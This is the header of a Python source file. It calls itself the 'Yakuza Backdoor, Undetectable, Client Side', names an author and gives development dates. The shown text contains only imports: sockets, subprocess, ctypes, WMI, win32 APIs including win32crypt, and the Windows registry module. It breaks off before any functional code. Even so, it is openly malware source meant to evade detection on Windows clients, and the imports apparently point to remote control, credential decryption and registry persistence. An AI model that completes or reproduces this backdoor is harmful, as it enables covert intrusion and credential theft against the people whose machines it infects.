""" Yakuza Backdoor, Undetectable, Client Side
        This is a Backdoor written in Python based on Yakuza Style
        Version: 1.0
------------------------------------------------------------
Author: Davood Yakuza
Start Developing Date: 11/9/2024 | 19 aban 1403.
End Developing Date:

"""

# Step 1: Import requires libraries
import socket
import os
from sys import argv, exit
import platform
from time import sleep
import ctypes
import subprocess
import threading
import wmi

import win32api
import winerror
import win32event
import win32crypt

from winreg import *

